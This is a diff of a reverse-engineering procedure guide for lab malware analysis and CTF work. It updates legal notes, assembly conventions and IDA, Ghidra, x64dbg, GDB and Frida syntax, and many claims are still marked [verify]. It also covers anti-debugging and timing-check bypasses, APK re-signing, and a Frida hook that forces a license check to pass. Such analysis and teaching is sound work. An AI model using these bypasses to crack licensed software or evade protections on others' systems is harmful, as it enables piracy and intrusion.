@@ -3,7 +3,7 @@ type: sop
 title: Reverse Engineering
 description: "Binary reverse engineering: Ghidra, IDA Pro, disassembly, decompilation, debugging & exploit development for security research and CTF challenges."
 created: 2025-10-11
-updated: 2026-09-20
+updated: 2026-10-31
 template_version: 2026-09-20
 tags:
   - sop
@@ -15,6 +15,8 @@ tags:
 ---
 
 # Reverse Engineering
+
+> **Authorized environments only.** Reverse, debug, and patch only your own binaries, CTF/crackme challenges, malware samples handled inside an isolated, disposable lab VM, and software you have written authorization to analyze. Never run samples on an analyst host or with a route to production. Cross-references: [[../../Investigations/Techniques/sop-legal-ethics|Legal & Ethics]] for the legal framework, [[../../Investigations/Techniques/sop-opsec-plan|OPSEC Plan]] for lab isolation and sample-handling discipline.
 
 > **Purpose:** Comprehensive guide to reverse engineering binaries, understanding assembly code, bypassing protections, and developing exploits for security research, malware analysis, and CTF competitions.
 
@@ -31,6 +33,8 @@ tags:
 7. [Exploit Development](#exploit-development)
 8. [Practical Workflows](#practical-workflows)
 9. [Tools Reference](#tools-reference)
+10. [Learning Resources](#learning-resources)
+11. [Reference Resources](#reference-resources)
 
 ---
 
@@ -51,11 +55,14 @@ tags:
 
 ### Legal & Ethical Considerations
 
-**Legal risks:**
-- **DMCA Section 1201 (US):** Prohibits circumventing technological protection measures (DRM, software activation)
-- **Computer Fraud and Abuse Act (CFAA):** Unauthorized access to computer systems
-- **Software license agreements:** May prohibit reverse engineering (enforceability varies)
-- **Copyright law:** Reverse engineering for interoperability generally permitted (fair use)
+The legal framework (DMCA § 1201, CFAA and equivalents, terms of service, disclosure) lives in [[../../Investigations/Techniques/sop-legal-ethics|Legal & Ethics]]; lab isolation is in [[../../Investigations/Techniques/sop-opsec-plan|OPSEC Plan]]. The notes below are RE-specific only.
+
+**RE-specific legal notes:**
+- **US interoperability:** 17 U.S.C. § 1201(f) lets a person who lawfully obtained the right to use a program circumvent a protection measure solely to identify and analyze the elements needed for interoperability of an independently created program, where those elements were not previously readily available to that person and the acts are not otherwise infringing. [verify 2026-10-31]
+- **US security research:** 37 CFR 201.40(b)(18) exempts circumvention on a lawfully acquired device, or on a system with the owner's or operator's authorization, solely for good-faith security research; it is not a safe harbor from the CFAA (rulemaking cycle and citation: see Legal & Ethics). [verify 2026-10-31]
+- **EU:** Software Directive 2009/24/EC Art. 6 allows a lawful user to decompile where indispensable for interoperability, confined to the parts needed; Art. 8 voids contract terms that override it. [verify 2026-10-30]
+- **UK:** CDPA 1988 s.50B allows a lawful user to decompile for interoperability under the same kind of conditions; s.296A voids licence terms that prohibit it. [verify 2026-10-30]
+- **Licence "no reverse engineering" clauses:** enforceability outside these exceptions varies by jurisdiction; resolve it before you start (see Legal & Ethics).
 
 **Ethical guidelines:**
 - ✅ Reverse engineering for security research (responsible disclosure)
@@ -176,9 +183,10 @@ add eax, ebx           ; EAX = EAX + EBX
 sub eax, 0x10          ; EAX = EAX - 0x10
 inc eax                ; EAX = EAX + 1
 dec eax                ; EAX = EAX - 1
-mul ebx                ; EAX = EAX * EBX (unsigned)
-imul ebx               ; EAX = EAX * EBX (signed)
-div ebx                ; EAX = EAX / EBX, EDX = remainder
+; One-operand mul/imul/div use the EDX:EAX pair (Intel SDM Vol. 2) [verify 2026-10-30]
+mul ebx                ; EDX:EAX = EAX * EBX (unsigned, 64-bit result)
+imul ebx               ; EDX:EAX = EAX * EBX (signed; "imul eax, ebx" keeps 32 bits)
+div ebx                ; EAX = EDX:EAX / EBX, EDX = remainder (zero EDX first: xor edx, edx)
 
 ; Logical operations:
 and eax, 0xFF          ; Bitwise AND (mask lower 8 bits)
@@ -240,8 +248,8 @@ add esp, 0x8           ; Caller cleans stack (2 args * 4 bytes)
 
 **fastcall:**
 ```nasm
-; First 2 arguments in ECX, EDX
-; Remaining arguments on stack
+; Microsoft __fastcall: first 2 DWORD-or-smaller arguments in ECX, EDX
+; Remaining arguments on stack right-to-left; callee cleans the stack (like stdcall) [verify 2026-10-30]
 
 ; Example: fastcall_func(1, 2, 3, 4)
 push 4                 ; arg 4 (stack)
@@ -257,11 +265,11 @@ call fastcall_func
 ```nasm
 ; First 4 arguments in registers: RCX, RDX, R8, R9
 ; Remaining arguments on stack
-; Caller allocates 32-byte "shadow space" on stack
-; Caller cleans stack
+; Caller allocates 32-byte "shadow space" on stack, with args 5+ stored above it
+; RSP is 16-byte aligned at the call; caller cleans stack [verify 2026-10-30]
 
 ; Example: func(1, 2, 3, 4, 5, 6)
-sub rsp, 0x28          ; Allocate shadow space (32 bytes) + align
+sub rsp, 0x38          ; 32-byte shadow space + 16 bytes for args 5-6 + 8 to keep RSP 16-byte aligned
 mov qword [rsp+0x28], 6  ; arg 6 (stack)
 mov qword [rsp+0x20], 5  ; arg 5 (stack)
 mov r9, 4              ; arg 4 (register)
@@ -269,7 +277,7 @@ mov r8, 3              ; arg 3 (register)
 mov rdx, 2             ; arg 2 (register)
 mov rcx, 1             ; arg 1 (register)
 call func
-add rsp, 0x28          ; Clean up
+add rsp, 0x38          ; Clean up
 ```
 
 **Linux x64 (System V AMD64 ABI):**
@@ -279,6 +287,8 @@ add rsp, 0x28          ; Clean up
 ; Return value in RAX
 
 ; Example: func(1, 2, 3, 4, 5, 6, 7)
+; RSP must be 16-byte aligned at the call (psABI); real code pads with sub rsp, 8
+; before the push or stores into pre-reserved stack space [verify 2026-10-30]
 push 7                 ; arg 7 (stack)
 mov r9, 6              ; arg 6 (register)
 mov r8, 5              ; arg 5 (register)
@@ -342,22 +352,22 @@ mov ecx, [ebp-0x8]     ; Load local var 2 into ECX
 
 | Tool | Type | Platform | Strengths | Cost |
 |------|------|----------|-----------|------|
-| **IDA Pro** | Disassembler/Decompiler | Windows, Linux, macOS | Industry standard, Hex-Rays decompiler, scripting (IDAPython) | Commercial ($$$) |
+| **IDA Pro** | Disassembler/Decompiler | Windows, Linux, macOS | Industry standard, Hex-Rays decompiler, scripting (IDAPython) | Commercial, tiered (Essential/Expert/Ultimate/Headless); IDA Home for non-commercial use; IDA Free at no cost (x86/x64 only, cloud decompiler) [verify 2026-10-30] |
 | **Ghidra** | Disassembler/Decompiler | Windows, Linux, macOS | Free, NSA-developed, excellent decompiler, Java/Python scripting | Free |
-| **Binary Ninja** | Disassembler/Decompiler | Windows, Linux, macOS | Modern UI, BNIL (intermediate language), Python API | Commercial ($$) |
-| **Radare2** | Disassembler | Windows, Linux, macOS | CLI-based, scriptable, FLIRT signatures | Free |
+| **Binary Ninja** | Disassembler/Decompiler | Windows, Linux, macOS | Modern UI, BNIL (intermediate language), Python API | Free edition (x86/x64/ARMv7/AArch64, no API or plugins); paid Non-Commercial, Commercial, Ultimate [verify 2026-10-30] |
+| **Radare2** | Disassembler (decompiler via r2ghidra/r2dec plugins) | Windows, Linux, macOS | CLI-based, scriptable, FLIRT signatures | Free (LGPL-3.0) [verify 2026-10-30] |
 | **Hopper** | Disassembler/Decompiler | macOS, Linux | macOS/iOS focus, ARM support | Commercial ($) |
-| **Cutter** | Disassembler | Windows, Linux, macOS | GUI for Radare2 | Free |
+| **Cutter** | Disassembler/Decompiler | Windows, Linux, macOS | GUI for Rizin (a radare2 fork); releases bundle the native Ghidra decompiler | Free (GPL-3.0) [verify 2026-10-30] |
 
 ### IDA Pro Basics
 
 **Loading a binary:**
 ```bash
-# Launch IDA Pro (Windows):
-ida64.exe malware.exe
+# Launch IDA (Windows). IDA 9.0+ ships one binary for 32/64-bit; 8.x and earlier used ida64 [verify 2026-10-30]
+ida.exe malware.exe
 
 # Linux:
-./ida64 malware.elf
+./ida malware.elf
 ```
 
 **Key IDA features:**
@@ -421,8 +431,8 @@ Address   Library      Function
 | **X** | Show cross-references (xrefs) |
 | **G** | Jump to address |
 | **Esc** | Go back |
-| **;** | Add comment |
-| **:** | Add repeatable comment |
+| **:** | Add comment [verify 2026-10-30] |
+| **;** | Add repeatable comment |
 | **Y** | Change function prototype |
 | **D** | Convert to data |
 | **C** | Convert to code |
@@ -431,10 +441,11 @@ Address   Library      Function
 **IDAPython scripting:**
 ```python
 # IDAPython: Rename all functions starting with "sub_"
+# Functions() lives in idautils; the bare name only works with IDAPython's compat auto-import [verify 2026-10-30]
 import idc
-import idaapi
+import idautils
 
-for func_ea in Functions():
+for func_ea in idautils.Functions():
     func_name = idc.get_func_name(func_ea)
     if func_name.startswith("sub_"):
         # Rename based on strings or behavior
@@ -446,6 +457,9 @@ for func_ea in Functions():
 ### Ghidra Basics
 
 **Launching Ghidra:**
+
+Ghidra 12.2 needs JDK 25 or later on `PATH` (12.0 and 12.1 needed JDK 21); a wrong Java is the usual reason `ghidraRun` fails. [verify 2026-10-30]
+
 ```bash
 # Linux/macOS:
 ./ghidraRun
@@ -480,7 +494,7 @@ void main(void) {
 
 **3. Symbol Tree:**
 - Functions, imports, exports, strings
-- Right-click → "References to" (find xrefs)
+- Right-click → **Show References to** (Ctrl+Shift+F) to list xrefs [verify 2026-10-31]
 
 **Ghidra shortcuts:**
 
@@ -488,18 +502,22 @@ void main(void) {
 |-----|--------|
 | **L** | Rename variable/function |
 | **;** | Add comment (EOL comment) |
-| **Ctrl+Shift+G** | Goto address |
-| **Ctrl+Shift+E** | Edit function signature |
-| **G** | Goto (jump to reference) |
-| **Ctrl+/** | Add/remove bookmark |
+| **G** | Go To (address or label) |
+| **Ctrl+Shift+G** | Patch instruction (assemble in place) [verify 2026-10-30] |
+| **Ctrl+F** | Search → Program Text (Ctrl+Shift+E in Ghidra 11.3 and earlier) [verify 2026-10-31] |
+| **Ctrl+D** | Add bookmark (**Ctrl+B** opens the Bookmarks window) [verify 2026-10-30] |
+
+In the Decompiler, right-click → **Edit Function Signature** (no default key); in the Listing, **F** runs **Edit Function...** on the function. [verify 2026-10-31]
 
 **Ghidra scripting (Python):**
 ```python
 # Ghidra Python: Find all calls to "strcpy" (dangerous function)
+# Runs under PyGhidra (CPython 3, default since Ghidra 12.0). Under Jython (Ghidra 11.x
+# and earlier, or "# @runtime Jython") replace the f-string with .format() [verify 2026-10-30]
 from ghidra.program.model.symbol import RefType
 
-strcpy_func = getFunction("strcpy")
-if strcpy_func:
+# getGlobalFunctions() replaces getFunction(name), deprecated for removal since Ghidra 7.4
+for strcpy_func in getGlobalFunctions("strcpy"):
     refs = getReferencesTo(strcpy_func.getEntryPoint())
     for ref in refs:
         if ref.getReferenceType() == RefType.UNCONDITIONAL_CALL:
@@ -521,8 +539,8 @@ if strcpy_func:
 strings malware.bin | grep -i "password"
 strings -e l malware.bin  # Unicode (little-endian) strings
 
-# Windows: Sysinternals strings.exe
-strings64.exe malware.exe | findstr /i "http"
+# Windows: Sysinternals strings.exe (scans ASCII and Unicode by default) [verify 2026-10-30]
+strings64.exe -nobanner malware.exe | findstr /i "http"
 
 # IDA Pro: Shift+F12 (Strings window)
 # Ghidra: Window → Defined Strings
@@ -534,14 +552,14 @@ Malware often hides strings via encoding/encryption:
 
 ```c
 // Example: XOR-encoded string
-char encoded[] = {0x1F, 0x0E, 0x0C, 0x0C, 0x18, 0x05, 0x3B, 0x00};
-char decoded[9];
+char encoded[] = {0x0F, 0x03, 0x0E, 0x15, 0x03, 0x10, 0x07};
+char decoded[8];
 
-for (int i = 0; i < 8; i++) {
+for (int i = 0; i < 7; i++) {
     decoded[i] = encoded[i] ^ 0x42;  // XOR with key 0x42
 }
-decoded[8] = '\0';
-// Result: "MALWARE"
+decoded[7] = '\0';
+// Result: "MALWARE" [verify 2026-10-30]
 ```
 
 **Decoding in IDA/Ghidra:**
@@ -550,8 +568,8 @@ decoded[8] = '\0';
 - Write script to decode:
 
 ```python
-# IDAPython: Decode XOR-encoded string
-encoded = [0x1F, 0x0E, 0x0C, 0x0C, 0x18, 0x05, 0x3B]
+# IDAPython: Decode XOR-encoded string (prints "Decoded: MALWARE") [verify 2026-10-30]
+encoded = [0x0F, 0x03, 0x0E, 0x15, 0x03, 0x10, 0x07]
 key = 0x42
 decoded = ''.join(chr(b ^ key) for b in encoded)
 print(f"Decoded: {decoded}")
@@ -584,7 +602,7 @@ user32.dll:
 | `CreateFileA`, `WriteFile`, `ReadFile` | File operations (ransomware, data theft) |
 | `WSAStartup`, `socket`, `connect` | Network communication (C2, data exfiltration) |
 | `CreateProcessA`, `ShellExecuteA` | Process execution (dropper, backdoor) |
-| `VirtualAlloc`, `WriteProcessMemory` | Code injection (process hollowing) |
+| `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread` / `SetThreadContext` | Remote code injection (hollowing, thread hijack); `VirtualAlloc` alone allocates in the calling process (local shellcode staging) [verify 2026-10-30] |
 | `RegOpenKeyExA`, `RegSetValueExA` | Registry modification (persistence) |
 | `CryptEncrypt`, `CryptDecrypt` | Encryption (ransomware, data protection) |
 
@@ -594,7 +612,7 @@ user32.dll:
 
 **Analyzing imports in Ghidra:**
 1. **Symbol Tree → Imports**
-2. Right-click → **References to** (show xrefs)
+2. Right-click → **Show References to** (Ctrl+Shift+F) (show xrefs)
 
 ---
 
@@ -691,28 +709,26 @@ run                    # Start execution
 StepInto               # F7 - Step into function call
 StepOver               # F8 - Step over function call
 StepOut                # Ctrl+F9 - Run until return
-RunToUser              # Alt+F9 - Run until user code (skip system DLLs)
+# RunToUserCode (alias rtu) is the Alt+F9 "Run to user code" action [verify 2026-10-30]
+RunToUserCode          # Alt+F9 - Run until user code (skip system DLLs)
 
-# Breakpoints:
+# Breakpoints (bl is WinDbg syntax; x64dbg uses bplist) [verify 2026-10-30]:
 bp 401000              # Set breakpoint at address 0x401000
 bp CreateFileA         # Set breakpoint on function
 bc 401000              # Clear breakpoint
-bl                     # List breakpoints
+bplist                 # List breakpoints
 
-# Memory:
+# Memory (x64dbg has no db/dd/da; "d" is disasm. Pick width in the dump pane) [verify 2026-10-30]:
 dump 402000            # Show memory dump at address
-d eax                  # Dump memory at address in EAX
-db 402000              # Dump bytes
-dd 402000              # Dump dwords
-da 402000              # Dump ASCII string
+dump eax               # Follow the address in EAX in the dump view
 
-# Registers:
-r eax = 42             # Set EAX to 0x42
-r rip = 401000         # Set instruction pointer (change execution flow)
+# Registers (x64dbg uses mov/set, not r; numbers are hex by default) [verify 2026-10-30]:
+mov eax, 42            # Set EAX to 0x42
+mov rip, 401000        # Set instruction pointer (change execution flow)
 
-# Search:
-find 402000, "password"   # Search for string in memory
-findall "http://"         # Find all occurrences
+# Search (patterns are hex bytes with ? wildcards, not quoted text) [verify 2026-10-30]:
+find 402000, "70 61 73 73 77 6F 72 64"   # "password" in the page containing 402000
+findall 402000, "68 74 74 70 3A 2F 2F"   # All "http://" in that page (findallmem for the whole map)
 
 # Comments:
 cmt 401000, "Main function starts here"
@@ -740,7 +756,7 @@ TraceOverConditional
 gdb ./program
 
 # Attach to running process:
-gdb -p <PID>
+gdb -p "$PID"
 
 # With arguments:
 gdb --args ./program arg1 arg2
@@ -804,12 +820,16 @@ layout regs            # Show TUI with registers
 **GDB with PEDA/GEF/pwndbg (enhanced plugins):**
 
 ```bash
-# Install PEDA (Python Exploit Development Assistance):
+# Install only ONE of these plugins: each installer below appends a `source` line
+# to ~/.gdbinit, and GDB runs every line there at startup [verify 2026-10-31]
+
+# Install PEDA (Python Exploit Development Assistance). Unmaintained (last master
+# commit 2021); prefer GEF or pwndbg on current GDB [verify 2026-10-30]
 git clone https://github.com/longld/peda.git ~/peda
 echo "source ~/peda/peda.py" >> ~/.gdbinit
 
-# Install GEF (GDB Enhanced Features):
-wget -O ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/master/gef.py
+# Install GEF (GDB Enhanced Features; default branch is main) [verify 2026-10-30]:
+wget -O ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/main/gef.py
 echo "source ~/.gdbinit-gef.py" >> ~/.gdbinit
 
 # Install pwndbg:
@@ -821,16 +841,17 @@ cd pwndbg
 checksec               # Check binary protections (NX, PIE, RELRO, Canary)
 vmmap                  # Show memory mappings
 telescope $rsp 20      # Show stack with dereferenced pointers
-pattern create 200     # Create cyclic pattern for finding offsets
-pattern offset 0x41614141  # Find offset of pattern in EIP/RIP
-rop                    # Search for ROP gadgets
+# Cyclic-pattern and ROP commands differ per plugin [verify 2026-10-30]
+pattern create 200     # PEDA/GEF: create cyclic pattern (pwndbg: cyclic 200)
+pattern offset 0x41614141  # PEDA: find offset in EIP/RIP (GEF: pattern search; pwndbg: cyclic -l)
+rop                    # pwndbg: search ROP gadgets (PEDA: ropgadget / ropsearch)
 ```
 
 ### Bypassing Anti-Debugging
 
 **MITRE ATT&CK: T1622 — Debugger Evasion**
 
-Anti-debug primitives appear in nearly every protected sample. The list below covers the checks you will encounter most often, with exact PEB offsets and `NtQueryInformationProcess` class numbers — these are stable across Windows 10 and 11 (x64) and pinned to Microsoft's documented `_PEB` and `PROCESSINFOCLASS` definitions. [verify 2026-04-25] for kernel build-specific PEB offsets above 0x100.
+Anti-debug primitives appear in nearly every protected sample. The list below covers the checks you will encounter most often, with exact PEB offsets and `NtQueryInformationProcess` class numbers — these are stable across Windows 10 and 11. `PEB.BeingDebugged` (+0x02) and `ProcessDebugPort` (7) are in Microsoft's documented `PEB` and `NtQueryInformationProcess` definitions; the `NtGlobalFlag` offsets (0x68 x86, 0xBC x64) and classes 0x1E/0x1F are undocumented but unchanged for many releases (Geoff Chappell's PEB notes, phnt headers). [verify 2026-10-30]
 
 **1. IsDebuggerPresent (Windows):**
 ```nasm
@@ -844,8 +865,9 @@ jnz debugger_detected   ; Jump if EAX != 0 (debugger present)
 ```bash
 # x64dbg: Set breakpoint on IsDebuggerPresent, modify return value
 bp IsDebuggerPresent
-# When hit: Set RAX = 0 (no debugger)
-r rax = 0
+# When hit: StepOut (Ctrl+F9) to the return, then set RAX = 0 (no debugger) [verify 2026-10-30]
+StepOut
+mov rax, 0
 ```
 
 **2. CheckRemoteDebuggerPresent:**
@@ -963,8 +985,9 @@ if (end - start > 1000) {
 **Bypass:**
 ```bash
 # x64dbg: Modify timing values or patch comparison
-# Set breakpoint before comparison, modify end value:
-r eax = <start_value>  # Make time difference = 0
+# After the first GetTickCount returns, save it in an x64dbg variable: mov $start, eax
+# Set breakpoint before comparison, modify end value (x64dbg mov/set) [verify 2026-10-30]:
+mov eax, $start        # Make time difference = 0
 ```
 
 ScyllaHide's "GetTickCount Hook" returns a fake monotonic delta that defeats the entire timing-check family without per-sample patching.
@@ -986,7 +1009,7 @@ ja debugger_detected
 # x64dbg: Assemble → Replace "cmp eax, 0x1000" with "cmp eax, 0xFFFFFFFF"
 ```
 
-For VMs, you can also disable user-mode `rdtsc` by setting `CR4.TSD` so it traps to ring 0, where the hypervisor returns a synthetic value — useful when the malware checks RDTSC in a tight loop and the comparison threshold is hidden. [inferred — practical effect; behavior depends on host VMM support]
+Do not set `CR4.TSD` for this: with TSD set, `rdtsc` at CPL > 0 raises #GP(0) (Intel SDM Vol. 2, RDTSC), and Linux exposes the same switch per process as `prctl(PR_SET_TSC, PR_TSC_SIGSEGV)`, which delivers SIGSEGV. The sample faults instead of reading a smaller delta; patch the comparison as shown above. [verify 2026-10-31]
 
 **9. Exception-based anti-debugging:**
 ```c
@@ -1086,7 +1109,7 @@ Devices:   \\.\VBoxGuest, \\.\VBoxMiniRdrDN, \\.\vmci, \\.\HGFS
 
 **6. Validating the hardened VM:**
 
-Before analyzing an evasive sample, run **pafish** (`github.com/a0rtega/pafish`) for a quick pass/fail report, or **al-khaser** (`github.com/LordNoteworthy/al-khaser`) for the comprehensive 170+ check matrix. Red lines indicate artifacts the malware will use to detect you. For deep transparency, **VBoxHardenedLoader** (`github.com/hfiref0x/VBoxHardenedLoader`) patches the VirtualBox kernel driver to suppress CPUID and device-name leaks while keeping shared folders functional.
+Before analyzing an evasive sample, run **al-khaser** (`github.com/ayoubfaouzi/al-khaser`, actively maintained) for a comprehensive check matrix, or **pafish** (`github.com/a0rtega/pafish`, archived; last commit 2021) for a quick pass/fail report. Red lines indicate artifacts the malware will use to detect you. **VBoxHardenedLoader** (`github.com/hfiref0x/VBoxHardenedLoader`) patched VirtualBox to suppress CPUID and device-name leaks, but it is unmaintained since 2020 and archived in 2023; its README says the driver it loads through is blocked on Windows 11, so treat it as reference only. [verify 2026-10-30]
 
 ### Dynamic Instrumentation (Frida)
 
@@ -1105,14 +1128,15 @@ frida --version
 
 ```javascript
 // Frida JavaScript: Hook MessageBoxA on Windows
-// Save as hook.js
+// Save as hook.js. Frida 17+ API: static Module.findExportByName/findBaseAddress/
+// enumerateExports and Memory.read* were removed; use Module instances and NativePointer reads [verify 2026-10-30]
 
-Interceptor.attach(Module.findExportByName("user32.dll", "MessageBoxA"), {
+Interceptor.attach(Process.getModuleByName("user32.dll").getExportByName("MessageBoxA"), {
     onEnter: function(args) {
         console.log("[MessageBoxA] Called!");
         console.log("  hWnd: " + args[0]);
-        console.log("  Text: " + Memory.readUtf8String(args[1]));
-        console.log("  Title: " + Memory.readUtf8String(args[2]));
+        console.log("  Text: " + args[1].readUtf8String());
+        console.log("  Title: " + args[2].readUtf8String());
         console.log("  Type: " + args[3]);
 
         // Modify arguments:
@@ -1141,7 +1165,7 @@ frida -l hook.js -f malware.exe
 **1. Bypass license check:**
 ```javascript
 // Hook check_license() function, force return TRUE
-var base = Module.findBaseAddress("malware.exe");
+var base = Process.getModuleByName("malware.exe").base;
 var check_license = base.add(0x1234);  // Offset of function
 
 Interceptor.attach(check_license, {
@@ -1156,9 +1180,9 @@ Interceptor.attach(check_license, {
 **2. Dump decrypted strings:**
 ```javascript
 // Hook decryption function, log decrypted output
-Interceptor.attach(Module.findExportByName(null, "decrypt_string"), {
+Interceptor.attach(Module.getGlobalExportByName("decrypt_string"), {
     onLeave: function(retval) {
-        var decrypted = Memory.readUtf8String(retval);
+        var decrypted = retval.readUtf8String();
         console.log("Decrypted string: " + decrypted);
     }
 });
@@ -1170,17 +1194,14 @@ Interceptor.attach(Module.findExportByName(null, "decrypt_string"), {
 var moduleName = "malware.exe";
 var module = Process.getModuleByName(moduleName);
 
-Module.enumerateExports(moduleName, {
-    onMatch: function(exp) {
-        if (exp.type === 'function') {
-            Interceptor.attach(exp.address, {
-                onEnter: function(args) {
-                    console.log("[Call] " + exp.name + " @ " + exp.address);
-                }
-            });
-        }
-    },
-    onComplete: function() {}
+module.enumerateExports().forEach(function(exp) {
+    if (exp.type === 'function') {
+        Interceptor.attach(exp.address, {
+            onEnter: function(args) {
+                console.log("[Call] " + exp.name + " @ " + exp.address);
+            }
+        });
+    }
 });
 ```
 
@@ -1262,22 +1283,23 @@ typedef struct _IMAGE_OPTIONAL_HEADER {
 
 ```bash
 # PEview (Windows GUI):
-# https://wjradburn.com/software/
+# http://wjradburn.com/software/   (plain HTTP; the HTTPS host does not answer)
 # Shows PE structure, sections, imports, exports
 
 # PE-bear (Windows GUI):
-# https://github.com/hasherezade/pe-bear-releases
+# https://github.com/hasherezade/pe-bear
 # Advanced PE editor and analyzer
 
 # pefile (Python):
 pip install pefile
+```
 
-python3
->>> import pefile
->>> pe = pefile.PE("malware.exe")
->>> print(hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
->>> for section in pe.sections:
-...     print(section.Name.decode(), hex(section.VirtualAddress))
+```python
+import pefile
+pe = pefile.PE("malware.exe")
+print(hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
+for section in pe.sections:
+    print(section.Name.decode(), hex(section.VirtualAddress))
 ```
 
 **Finding entry point:**
@@ -1550,9 +1572,11 @@ apktool d app.apk -o app_decoded
 # Edit smali code, then rebuild:
 apktool b app_decoded -o app_modified.apk
 
-# Sign APK:
-jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
-  -keystore my.keystore app_modified.apk alias_name
+# Align, then sign (Android SDK build-tools). zipalign must run BEFORE apksigner;
+# any change after signing invalidates the signature. jarsigner writes only a v1
+# (JAR) signature, which Android 11+ rejects for apps targeting API 30+.
+zipalign -P 16 -f -v 4 app_modified.apk app_aligned.apk
+apksigner sign --ks my.keystore --out app_signed.apk app_aligned.apk
 ```
 
 **Analyzing native libraries (.so files):**
@@ -1598,7 +1622,7 @@ lipo -thin arm64 sample -output sample.arm64
 - **Segments and sections.** `__TEXT` (code, read-only), `__DATA` / `__DATA_CONST` (writable globals), `__LINKEDIT` (symbol/string tables, code signature, dyld trie).
 - **Code signature is mandatory on arm64 macOS and iOS.** Every binary must be signed (ad-hoc `codesign -s -` is enough for local analysis). Patching a Mach-O on disk invalidates the signature; re-sign with `codesign -fs - patched_binary` or it will fail to launch.
 - **System Integrity Protection (SIP)** prevents debugging Apple-signed system binaries even as root. Use Apple's own `lldb` against your own binaries, or disable SIP in Recovery (`csrutil disable`) on a dedicated analysis machine — never on a daily driver.
-- **Hardened runtime / library validation.** Apps with `com.apple.security.cs.disable-library-validation = false` reject unsigned dylib injection — Frida and similar tools require either ad-hoc re-signing with the entitlement removed, or Apple's `get-task-allow` debugging entitlement.
+- **Hardened runtime / library validation.** The hardened runtime enforces library validation by default: only libraries signed by Apple or with the app's own Team ID load, unless the app carries the `com.apple.security.cs.disable-library-validation` entitlement. Unsigned dylib injection is therefore rejected — Frida and similar tools require either ad-hoc re-signing with `com.apple.security.cs.disable-library-validation` added, or Apple's `get-task-allow` debugging entitlement. [verify 2026-10-31]
 
 **ARM64 disassembly basics:**
 
@@ -1635,15 +1659,15 @@ add  x0, x0, sym@PAGEOFF
 |------|-------------|-----------|-------|
 | **Hopper Disassembler** | Native | Yes | First-class Mach-O / ARM64 support, reasonable price |
 | **IDA Pro 8.x+** | Native | Yes | Decompiler covers AArch64; iOS dyldcache extractor |
-| **Ghidra 11.x** | Native (Java) | Yes | Free; AArch64 decompiler is competent though noisier than IDA |
+| **Ghidra 12.x** | Native (Java) | Yes | Free; AArch64 decompiler is competent though noisier than IDA [verify 2026-10-31] |
 | **Binary Ninja** | Native | Yes | Strong arm64 support |
 | **otool / lldb** | System | No | Apple's stock disassembler and debugger |
 | **dyld_shared_cache_extract** | macOS | iOS image | Extract individual frameworks from `dyld_shared_cache_arm64e` |
 
 **iOS specifics:**
 
-- **`arm64e` vs `arm64`.** A14 / M1 and later use `arm64e`, which adds **Pointer Authentication Codes (PAC)**. Function pointers have a cryptographic signature in the upper bits — strip with `xpaci` / `xpacd` or read raw bytes for static analysis. Decompilers handle this; hand-written ROP does not.
-- **iOS application binaries** live inside the IPA (`unzip app.ipa`) under `Payload/AppName.app/AppName`. Pre-iOS 16 they are FairPlay-encrypted (DRM); decrypt on a jailbroken device with `frida-ios-dump` or `Clutch` before static analysis.
+- **`arm64e` vs `arm64`.** A12 and later (and all Apple silicon Macs) use `arm64e`, which adds **Pointer Authentication Codes (PAC)**. Function pointers have a cryptographic signature in the upper bits — strip with `xpaci` / `xpacd` or read raw bytes for static analysis. Decompilers handle this; hand-written ROP does not. [verify 2026-10-31]
+- **iOS application binaries** live inside the IPA (`unzip app.ipa`) under `Payload/AppName.app/AppName`. App Store binaries are FairPlay-encrypted (DRM): `otool -l` shows an `LC_ENCRYPTION_INFO_64` load command whose `cryptid` is non-zero (0 means not encrypted). Decrypt on a jailbroken device with `frida-ios-dump` before static analysis; `Clutch` is legacy (last release 2.0.4, 2016). [verify 2026-10-30]
 - **dyld shared cache.** On iOS, system frameworks are not standalone files — they live inside `/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e`. Extract with `dyld-shared-cache-extractor` (Ghidra ships one) before opening individual frameworks.
 
 **Dynamic analysis on Apple Silicon:**
@@ -1651,11 +1675,16 @@ add  x0, x0, sym@PAGEOFF
 ```bash
 # lldb on macOS — Apple's stock debugger (no GDB on arm64 macOS)
 lldb ./sample
+```
+
+```text
 (lldb) breakpoint set -n main
 (lldb) run
 (lldb) register read
 (lldb) memory read --format x --size 8 $sp
+```
 
+```bash
 # Frida works on arm64 macOS / iOS, but the binary must be ad-hoc re-signed
 # without library validation, or run on a jailbroken device.
 codesign --remove-signature ./sample
@@ -1728,14 +1757,14 @@ password[9] = '\0';
 | **ASPack** | `.aspack`, `.adata` | `aSPack` string, low import count | Partially (community tools) |
 | **PECompact** | `pec1`, `pec2` | Short stub section | Partially |
 | **MPRESS** | `.MPRESS1`, `.MPRESS2` | LZMA compression, 1–2 imports | Partially |
-| **Themida / WinLicense** | `.themida`, `.winlicence` | Virtualized code, anti-debug, large protected section | No — dump after self-unpack |
+| **Themida / WinLicense** | `.themida` | Virtualized code, anti-debug, large protected section | No — dump after self-unpack |
 | **VMProtect** | `.vmp0`, `.vmp1`, `.vmp2` | Custom VM bytecode, heavy anti-tamper | No — dump |
 | **Enigma Protector** | `.enigma1`, `.enigma2` | License-check stubs | No — dump |
 | **Custom / unknown** | Non-standard names | High entropy, minimal imports, no DiE signature | Dump-only; assume APT-grade |
 
 **Detecting packed binaries:**
 
-Use **Detect It Easy (DiE)** as the primary tool — it carries 300+ packer/compiler signatures and renders per-section entropy. **PE-bear** and **pestudio** are good secondary opinions; **PEiD** is legacy but still useful for older signature hits that DiE misses.
+Use **Detect It Easy (DiE)** as the primary tool — it carries a large, actively maintained packer/compiler/protector signature database and renders per-section entropy. **PE-bear** and **pestudio** are good secondary opinions; **PEiD** is legacy but still useful for older signature hits that DiE misses.
 
 ```bash
 # Entropy as a fast triage signal:
@@ -1775,7 +1804,7 @@ upx -d packed.exe -o unpacked.exe
 
 # Manual unpacking (if UPX modified):
 # 1. Find OEP (Original Entry Point) via debugger
-# 2. Set breakpoint on "pushad" instruction (typical UPX stub)
+# 2. Set breakpoint on "pushad" instruction (32-bit UPX stub; pushad is invalid in 64-bit mode)
 # 3. Run until unpacking complete
 # 4. Dump process memory to file
 ```
@@ -1823,7 +1852,7 @@ See [Dynamic Analysis → Bypassing Anti-Debugging](#bypassing-anti-debugging) f
 
 **Patching anti-debugging:**
